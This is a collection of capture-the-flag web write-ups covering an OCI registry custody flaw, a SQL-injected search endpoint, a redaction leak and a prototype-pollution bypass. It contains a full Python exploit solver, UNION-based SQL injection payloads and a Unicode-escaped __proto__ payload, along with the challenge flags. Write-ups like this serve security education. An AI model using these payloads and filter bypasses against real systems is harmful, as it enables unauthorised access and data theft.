# Cryovault — Web write-ups

Three challenge tracks are collected here: Attestation, ISFCR, and The Meridian. ISFCR contains two smaller web challenges.

## Attestation

The challenge exposes a small OCI registry and a custody workflow. A case session provides `/catalog.json`, `/policy.json`, registry endpoints, and three desks: `/api/notarize`, `/api/review`, and `/api/open`. The goal is to open a live case even though notarization accepts only the retired manifest.

### Policy and obstacles

The policy requires a live config, a live evidence blob, a release record inside a POSIX tar layer, a notary claim attached as a referrer, and an OCI index approved by review. Four checks have to be handled together:

1. The intake filter blocks a tar file whose ordinary header directly names the protected release path.
2. `/api/notarize` signs only the retired manifest.
3. The original evidence blob has `custody: "retired"`.
4. Review selects a retired child from the index, while open needs a live child.

### PAX header bypass

The tar member's ordinary name can be harmless while its PAX `path` attribute names the required release path. The intake filter reads the ordinary header; the backend tar parser honors the PAX override.

```python
import io, json, tarfile

content = json.dumps(release_record, separators=(',', ':')).encode()
buffer = io.BytesIO()
with tarfile.open(fileobj=buffer, mode="w", format=tarfile.PAX_FORMAT) as archive:
    member = tarfile.TarInfo(name="benign/file.json")
    member.size = len(content)
    member.pax_headers = {"path": release_path}
    archive.addfile(member, io.BytesIO(content))
tar_bytes = buffer.getvalue()
```

### Evidence, notary, and index

Download the original evidence blob, change its custody to `live`, hash the new bytes, and upload it. Create the live config and manifest with the evidence descriptor followed by the release tar layer. Notarize the original retired manifest, then attach its valid notary descriptor to the live manifest through the registry's legacy `sha256-<digest>` referrer tag.

Finally, put both the retired and live manifests in one OCI index with the same target platform. Review selects the retired child and issues a ticket for the index. Open uses that ticket but selects the live child, which now satisfies the live policy. The mismatch between the two selection paths is the logic flaw.

The Python solver below automates the complete sequence. The reported result is `isfcr{attest_5d60_notary_41a34ce7_laundered}`.

### Complete Attestation solver

```python
import urllib.request
import json
import hashlib
import io
import tarfile

BASE_URL = "https://isfcrpesu-attestation.chals.io"

def req(url, method="GET", data=None, content_type=None):
    headers = {"Accept": "application/json"}
    if content_type:
        headers["Content-Type"] = content_type
    body = None
    if data:
        if isinstance(data, (dict, list)):
            body = json.dumps(data).encode()
        elif isinstance(data, str):
            body = data.encode()
        else:
            body = data
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(r)
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        return json.loads(e.read().decode())

def sha256_digest(data):
    if isinstance(data, str):
        data = data.encode()
    return "sha256:" + hashlib.sha256(data).hexdigest()

def solve():
    print("[*] Opening case session...")
    session = req(f"{BASE_URL}/session", method="POST")
    S = session["base"]
    token = session["token"]
    print(f"[+] Session: {token}")
    catalog = req(f"{S}/catalog.json")
    policy = req(f"{S}/policy.json")
    
    case = catalog["case"]
    platform = catalog["platform"]
    ret_dig = catalog["retired_manifest"]["digest"]
    ret_sz = catalog["retired_manifest"]["size"]
    rel_path = policy["live_layer"]["release_path"]
    rel_rec = policy["live_layer"]["release_record"]
    claim_anno = policy["referrers"]["claim_annotation"]
    req_claim = policy["referrers"]["required_claim"]
    notary_media = policy["referrers"]["mediaType"]

    print(f"[+] Case ID: {case}")
    print(f"[+] Target platform: {platform}")
    print(f"[+] Release path: {rel_path}")
    print(f"[+] Required claim: {claim_anno} = {req_claim}")
    print("[*] Notarizing retired manifest...")
    notarize_res = req(f"{S}/api/notarize", method="POST", data={"digest": ret_dig})
    att_dig = notarize_res["attestation"]
    print(f"[+] Attestation: {att_dig}")
    print("[*] Creating and uploading live evidence blob...")
    ret_ev_dig = catalog["evidence"]["digest"]
    ret_ev = req(f"{S}/v2/cryovault/blobs/{ret_ev_dig}")
    live_ev = dict(ret_ev)
    live_ev["custody"] = "live"
    live_ev_bytes = json.dumps(live_ev, separators=(',', ':')).encode()
    live_ev_dig = sha256_digest(live_ev_bytes)
    req(f"{S}/v2/cryovault/blobs/{live_ev_dig}", method="PUT", data=live_ev_bytes, content_type="application/vnd.cryovault.evidence.v1+json")
    print("[*] Uploading release tar layer using PAX bypass...")
    content = json.dumps(rel_rec, separators=(',', ':')).encode()
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w", format=tarfile.PAX_FORMAT) as tf:
        info = tarfile.TarInfo(name="benign/file.json")
        info.size = len(content)
        info.pax_headers = {"path": rel_path}
        tf.addfile(info, io.BytesIO(content))
    tar_bytes = tar_buf.getvalue()
    tar_dig = sha256_digest(tar_bytes)
    req(f"{S}/v2/cryovault/blobs/{tar_dig}", method="PUT", data=tar_bytes, content_type="application/vnd.cryovault.layer.v1+tar")
    print("[*] Creating live manifest...")
    lc = json.dumps({"case": case, "evidence": live_ev_dig, "layer": tar_dig, "scope": "live"}, separators=(',', ':')).encode()
    lc_dig = sha256_digest(lc)
    req(f"{S}/v2/cryovault/blobs/{lc_dig}", method="PUT", data=lc, content_type="application/vnd.cryovault.config.v1+json")

    lm = json.dumps({
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.manifest.v1+json",
        "artifactType": "application/vnd.cryovault.custody.v1+json",
        "config": {"mediaType": "application/vnd.cryovault.config.v1+json", "digest": lc_dig, "size": len(lc)},
        "layers": [
            {"mediaType": "application/vnd.cryovault.evidence.v1+json", "digest": live_ev_dig, "size": len(live_ev_bytes)},
            {"mediaType": "application/vnd.cryovault.layer.v1+tar", "digest": tar_dig, "size": len(tar_bytes)}
        ]
    }, separators=(',', ':')).encode()
    lm_dig = sha256_digest(lm)
    req(f"{S}/v2/cryovault/manifests/{lm_dig}", method="PUT", data=lm, content_type="application/vnd.oci.image.manifest.v1+json")
    print("[*] Attaching notary referrer to live manifest...")
    lm_hex = lm_dig.split(":")[1]
    lm_tag = f"sha256-{lm_hex}"
    ref_idx = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [
            {
                "mediaType": notary_media,
                "artifactType": notary_media,
                "digest": att_dig,
                "size": 210,
                "annotations": {claim_anno: req_claim}
            }
        ]
    }
    req(f"{S}/v2/cryovault/manifests/{lm_tag}", method="PUT", data=json.dumps(ref_idx).encode(), content_type="application/vnd.oci.image.index.v1+json")
    print("[*] Creating multi-manifest index...")
    idx = {
        "schemaVersion": 2,
        "mediaType": "application/vnd.oci.image.index.v1+json",
        "manifests": [
            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": ret_dig, "size": ret_sz, "platform": platform},
            {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": lm_dig, "size": len(lm), "platform": platform}
        ]
    }
    req(f"{S}/v2/cryovault/manifests/exploit-index", method="PUT", data=json.dumps(idx).encode(), content_type="application/vnd.oci.image.index.v1+json")
    print("[*] Requesting review ticket...")
    rev = req(f"{S}/api/review", method="POST", data={"reference": "exploit-index"})
    print(f"[+] Review response: {rev}")
    print("[*] Opening case to retrieve flag...")
    res = req(f"{S}/api/open", method="POST", data={"reference": "exploit-index", "ticket": rev["ticket"]})
    print(f"\n[★] FLAG: {res.get('flag')}")
    print(f"[+] Full response: {json.dumps(res, indent=2)}")

if __name__ == "__main__":
    solve()
```

## ISFCR

### The Hidden Test Case

LeetVault's legacy search endpoint, `/api/problems?search=`, is vulnerable to SQL injection. An `OR 1=1` probe returns the normal six rows, while `AND 1=2` returns none, confirming that the search value changes the SQL predicate.

```sql
' OR 1=1--
' AND 1=2--
' UNION SELECT 1,2,3,4--
```

Four columns are returned: `id`, `title`, `difficulty`, and `category`. SQLite's `sqlite_master` reveals an `internal_notes` table. Reading its `content` field exposes the hidden verification value.

```sql
' UNION SELECT 1,name,'Easy','Test' FROM sqlite_master--
' UNION SELECT id,content,note_type,created_at FROM internal_notes--
```

The recovered flag is `isfcr{tw0_sum_h1dd3n_t3st_c4s3_a91c3e7}`.

### Draftpad

Draftpad has public and private document regions. Pins identify `blk_pstart` as the start of the private area and `blk_pend` as its end, but the supposedly redacted content still appears in the main document table, `/api/export/public`, and `/api/document`. The exposed `blk_flag` block contains `isfcr{merge_shifts_the_wall_not_the_window}`.

## The Meridian

The Meridian is a photography museum SPA. Its hidden vault contains a negative that the public interface does not show. The shared view is serialized in the `?s=` parameter as base64url JSON.

### Prototype pollution bypass

`parseStatePayload` rejects raw strings containing `__proto__`, `constructor`, or `prototype`, but a JSON key written with Unicode escapes bypasses the raw-string filter. `JSON.parse` reconstructs the key, and the recursive `deepMerge` writes through it to the prototype.

```json
{"\u005f\u005fproto\u005f\u005f":{"vault":true}}
```

The sanitizer resets the config's own access tier and removes an own `vault` property. The polluted inherited value survives that check, unlocking `#/staff`.

### Valid curators and vault parameters

The staff memo says to select curators whose certificates verify under the current registrar pepper, in accession order. It defines rounds as `1000 + (sum of those accession years mod 4096)`. Verification of the 14 exhibits leaves five valid curators:

| Accession | Curator | Year |
| --- | --- | ---: |
| MRD-1971-0148 | E. Vantar | 1971 |
| MRD-1984-0912 | R. Oikawa | 1984 |
| MRD-1990-0025 | H. Delacroix | 1990 |
| MRD-2003-0777 | K. Adeyemi | 2003 |
| MRD-2011-0410 | S. Marchetti | 2011 |

Their years sum to 9959, so the required round count is `1000 + (9959 mod 4096) = 2767`. Supplying the ordered curators and rounds in the polluted vault configuration opens the vault. The reported flag is `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}`.
